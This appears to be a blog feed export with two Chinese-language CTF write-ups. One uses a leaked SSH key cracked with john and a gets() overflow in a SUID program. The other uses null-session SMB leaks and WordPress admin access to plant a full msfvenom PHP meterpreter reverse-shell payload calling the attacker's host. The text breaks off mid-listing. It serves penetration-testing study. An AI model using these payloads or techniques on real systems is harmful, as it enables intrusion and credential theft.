        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26524701&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/827.png" alt="图片"></p><p>靶场作者：<code>@_timk</code><br>操作系统：<code>Linux</code><br>任务：拿到 <code>/root/flag.txt</code><br>靶场 IP：<code>10.10.10.135</code></p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>利用 <code>Join the Rippe</code> 的 <code>ssh2john</code> 破解<code>SSH</code>私钥</p><p>通过简单的代码审计<code>C语言</code>程序来<code>溢出提权</code></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶场IP后使用<code>NMAP</code>扫描一下端口开放服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.10.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/828.png" alt="图片"></p><p>通过<code>NMAP</code>扫描结果来看，他开放了：<code>22</code>（ssh）、<code>80</code>（http）、<code>31337</code>（http）三个端口，其中<code>80</code>和<code>31337</code>是<code>web</code>服务！</p><p>先来看他<code>80</code>端口的<code>web</code>页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/829.png" alt="图片"></p><p>在页面上并没有显示一些东西，只是一个由<code>Nginx</code>容器搭建的web页面，先扫扫它的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.135/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/830.png" alt="图片"></p><p>发现也没有什么目录和文件，那么80端口无法突破！我们换下一个<code>31337</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/831.png" alt="图片"></p><p>访问了<code>web</code>后发现是由<code>Apache</code>搭建的网站，我们继续扫扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.135:31337</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/832.png" alt="图片"></p><p>这个时候发现了几个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+ http://10.10.10.135:31337/.bash_history (CODE:200|SIZE:188)                  </span><br><span class="line">+ http://10.10.10.135:31337/.bashrc (CODE:200|SIZE:3526)                       </span><br><span class="line">+ http://10.10.10.135:31337/.profile (CODE:200|SIZE:675)                       </span><br><span class="line">+ http://10.10.10.135:31337/.ssh (CODE:200|SIZE:43)                            </span><br><span class="line">+ http://10.10.10.135:31337/robots.txt (CODE:200|SIZE:70)    </span><br></pre></td></tr></table></figure><p>其中访问 <code>robots.txt</code> 后发现了这些，也正如上图扫描出来的文件内容！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/833.png" alt="图片"></p><p>打开 <code>taxes</code> 后拿到了第一个 <code>Flag</code>！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good job! Here is a flag: flag1&#123;make_america_great_again&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/834.png" alt="图片"></p><h2 id="SSH私钥公钥泄露"><a href="#SSH私钥公钥泄露" class="headerlink" title="SSH私钥公钥泄露"></a>SSH私钥公钥泄露</h2><p>在刚刚扫描出来的结果中，有一个 <code>.ssh</code> 的文件引起了我的注意，访问后页面上回显了 <code>ssh</code> 连接的<code>私钥</code>和<code>公钥</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337/.ssh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/835.png" alt="图片"></p><p><code>id_rsa</code>（私钥）、<code>authorized_keys</code>（公钥，认证密钥）<code>id_rsa.pub</code>（公钥），访问以下文件可以把它们下载到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.135:31337/.ssh/id_rsa</span><br><span class="line">http://10.10.10.135:31337/.ssh/authorized_keys</span><br><span class="line">http://10.10.10.135:31337/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/836.png" alt="图片"></p><p>下载到本地后查看<code>公钥</code>发现用户名是 <code>simon</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/837.png" alt="图片"></p><p>尝试使用 <code>私钥</code>（id_rsa）登陆 <code>SSH</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa simon@10.10.10.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/838.png" alt="图片"></p><h2 id="使用Join-the-Ripper的ssh2john破解SSH私钥"><a href="#使用Join-the-Ripper的ssh2john破解SSH私钥" class="headerlink" title="使用Join the Ripper的ssh2john破解SSH私钥"></a>使用Join the Ripper的ssh2john破解SSH私钥</h2><p>这个时候发现登录不进去，原因是密码不对！接下来使用 <code>ssh2john</code> 破解 <code>id_rsa</code>（私钥）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看 ssh2john 文件的路径</span><br><span class="line">locate ssh2john</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/839.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py</span><br></pre></td></tr></table></figure><p>然后把 <code>ssh2john.py</code> 复制到当前路径，接下来就利用 <code>ssh2john</code> 把 <code>id_rsa</code>(私钥)转换为 <code>john</code> 可识别的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ssh2john.py id_rsa &gt; liuwx</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/840.png" alt="图片"></p><p>最后使用 <code>Join the Ripper</code> 来破解 <code>liuwx</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john liuwx</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/841.png" alt="图片"></p><p>破解成功，密码为：<code>starwars</code> !</p><p>拿到密码后进行<code>SSH</code> 连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa simon@10.10.10.135</span><br><span class="line">user：simon</span><br><span class="line">pass：starwars</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/842.png" alt="图片"></p><p>登陆成功后，我切换到 <code>/root</code> 目录下发现了 <code>flag.txt</code> ，但是查看不了它的内容：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/843.png" alt="图片"></p><p>权限太小了所以不能查看 <code>flag.txt</code> 文件！</p><h2 id="软件溢出提权"><a href="#软件溢出提权" class="headerlink" title="软件溢出提权"></a>软件溢出提权</h2><p>我们先来查找一下那些文件是 <code>root</code> 权限的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">注释：</span><br><span class="line">find / 从根目录查找</span><br><span class="line">    -perm -4000 具有执行权限的文件</span><br><span class="line">    2&gt;/dev/null 避免输出错误</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/844.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/local/bin/read_message</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure><p>通过搜索 <code>root</code> 权限的文件我们可以查看到 <code>read_message</code> ，是不是似曾相识？对，就是 <code>/home</code> 目录下的 <code>read_message.c</code> 文件！通过查看 <code>read_message.c</code> 文件发现是一段由 <code>C 语言</code>编写的程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat read_message.c</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/845.png" alt="图片"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// You&#x27;re getting close! Here&#x27;s another flag:</span></span><br><span class="line"><span class="comment">// flag2&#123;use_the_source_luke&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> program[] = <span class="string">&quot;/usr/local/sbin/message&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> authorized[] = <span class="string">&quot;Simon&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is your name?\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only compare first five chars to save precious cycles:</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(authorized, buf, <span class="number">5</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s! Here is your message:\n\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// This is safe as the user can&#x27;t mess with the binary location:</span></span><br><span class="line">        execve(program, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\n&quot;</span>, buf, authorized);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/846.png" alt="图片"></p><p>通过代码审计得到了 flag2 为：<code>flag2&#123;use_the_source_luke&#125;</code>，其中代码的意思就是：使用 <code>strncmp</code>函数来<code>比较</code>输入的内容数组 <code>authorized</code>（Simon）而且字符为<code>5</code>，第三个参数 <code>buf</code> 是数组，也就是说最大字符<code>不能超过20</code>，如果等于 authorized（Simon）并且字符<code>不超过20</code>那么就 <code>printf</code> 打印出以下内容：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/847.png" alt="图片"></p><p>如果输出不等于 <code>authorized</code> ，则 <code>printf</code> 输出以下内容：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/848.png" alt="图片"></p><p>而最终通过<code>代码审计</code>，<code>buf</code> 不能超过<code>20</code>个字符，超过了就可以利用 <code>execve</code> 函数来让我们进行<code>溢出</code>得到 <code>root</code> 权限，具体的是输入正确的 <code>Simon</code>然后后面随便输入字符<code>超过20</code>个字符然后进入到 <code>program</code> 目录，我们可以替换为 <code>/bin/sh</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/849.png" alt="图片"></p><p>最终通过溢出提权为 <code>root</code> 拿到 <code>flag</code>！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过<code>SSH</code>私钥泄露，利用<code>Join the Ripper</code>来破解私钥登陆<code>SSH</code>,最终代码审计<code>read_message.c</code>程序利用<code>溢出提权</code>得到<code>root</code>拿到<code>flag</code>!</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> 溢出提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Lazysysadmin-WriteUP，通过SMB空密码泄露铭感文件再到Wordpress获取Shell拿到Flag</title>
      <link href="/2019/12/22/CTF-Lazysysadmin/"/>
      <url>/2019/12/22/CTF-Lazysysadmin/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=499793306&auto=1&height=66"></iframe><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/800.png" alt="图片"></p><p>HackNmme：Lazysysadmin<br>Task：Get /root/proof.txt</p><h2 id="学习到的知识点"><a href="#学习到的知识点" class="headerlink" title="学习到的知识点"></a>学习到的知识点</h2><p><code>SMB</code>协议：<code>print$</code>(打印机服务)、<code>share$</code>（共享文件夹服务）、<code>IPC$</code>（空链接）<br>通过<code>Wordpress</code>后台的<code>404</code>页面拿<code>Webshell</code></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>查看 <code>eth0</code> 网卡的 <code>10.10.10.1</code> <code>C段</code>下有那些主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 10.10.10.1/24</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/801.png" alt="图片"></p><p>其中，<code>10.10.10.133</code> 是我们的靶机<code>IP</code>！接着用<code>NMAP</code>扫描端口开放服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.133</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/802.png" alt="图片"></p><p>它总共开放了：<code>22</code>,<code>80</code>,<code>139</code>,<code>445</code>,<code>3306</code>,<code>6667</code>端口！我们先通过<code>web</code>端下手：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL = http://10.10.10.133/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/803.png" alt="图片"></p><p>接着习惯性的用<code>KALI</code>自带的<code>dirb</code>扫一下它的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.133</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/804.png" alt="图片"></p><h2 id="SMB协议空密码获取铭感文件"><a href="#SMB协议空密码获取铭感文件" class="headerlink" title="SMB协议空密码获取铭感文件"></a>SMB协议空密码获取铭感文件</h2><p>先让它扫着，我们继续找其他突破口，通过刚刚的<code>NMAP</code>扫描结果得出它开放了<code>SMB</code>协议（是一种在局域网上共享文件和打印机的一种通信协议，它为局域网的不同计算机之间提供文件及打印机等资源的共享服务），我们尝试看看能不能连接到它的<code>SMB</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.133</span><br><span class="line">-L 指定一个IP</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/805.png" alt="图片"></p><p>用 <code>smbclient</code> 连接到 <code>10.10.10.133</code> 的 <code>SMB</code> 协议的时候，从上图得知他弹出要密码，但是我没有密码使用<code>空密码</code>尝试连接，结果连接成功返回以上信息！通过上图我们得知它有三个服务：<code>print$</code>（打印机服务器）、<code>share$</code>（共享文件夹）、<code>$IPC</code>（空链接），我们尝试对他们进行<code>空密码</code>连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\10.10.10.133\share$&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/806.png" alt="图片"></p><p>通过尝试用<code>空密码</code>连接<code>打印机服务</code>失败，而连接到<code>共享文件夹服务</code>成功！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/807.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get deets.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/808.png" alt="图片"></p><p>通过把 <code>deets.txt</code> 文件下载到本地，发现是一个密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/809.png" alt="图片"></p><p>接着又通过切换到 <code>wordpress</code> 目录下发现了一个 <code>wp-config.php</code> 配置文件，使用 <code>get</code> 命令把它下载到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get wp-config.php </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/810.png" alt="图片"></p><p>通过 <code>gedit</code> 打开 <code>wp-config.php</code> 发现了它的<code>数据库连接</code>信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line"></span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;Admin&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;TogieMYSQL12345^^&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/811.png" alt="图片"></p><p>从上图得知，他的数据库名是 <code>wordpress</code>，用户名是 <code>Admin</code>，密码为 <code>TogieMYSQL12345^^</code>，这个时候我尝试看看能不能登录到它数据库里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.10.10.133 -u Admin -p</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/812.png" alt="图片"></p><p>输入密码后发现登录不进去，可能是关掉了外联。额，这个时候回到刚刚扫描的 <code>web</code> ，发现是用 <code>wordpress</code> 的<code>CMS</code>，然后后台也扫描出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.133/wordpress/wp-login.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/813.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/814.png" alt="图片"></p><h2 id="通过Wordpress的404页面拿shell"><a href="#通过Wordpress的404页面拿shell" class="headerlink" title="通过Wordpress的404页面拿shell"></a>通过Wordpress的404页面拿shell</h2><p>通过刚刚 <code>get</code> 下来的数据库账号密码尝试登陆 <code>wordpress</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER: Admin</span><br><span class="line">PASS: TogieMYSQL12345^^</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/815.png" alt="图片"></p><p>成功登陆到 <code>wordpress</code>，接下来就是用 <code>MSF</code> 来生成一个 <code>php</code>的木马来得到网站权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.128 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/816.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/**/</span> error_reporting(<span class="number">0</span>); <span class="variable">$ip</span> = <span class="string">&#x27;10.10.10.128&#x27;</span>; <span class="variable">$port</span> = <span class="number">4444</span>; <span class="keyword">if</span> ((<span class="variable">$f</span> = <span class="string">&#x27;stream_socket_client&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://<span class="subst">&#123;$ip&#125;</span>:<span class="subst">&#123;$port&#125;</span>&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; <span class="keyword">die</span>(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket&#x27;</span>); &#125; <span class="keyword">switch</span> (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; <span class="keyword">die</span>(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; <span class="keyword">switch</span> (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="keyword">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>(<span class="variable">$b</span>); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>打开 <code>msfconsole</code> 控制台进行监听：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/817.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 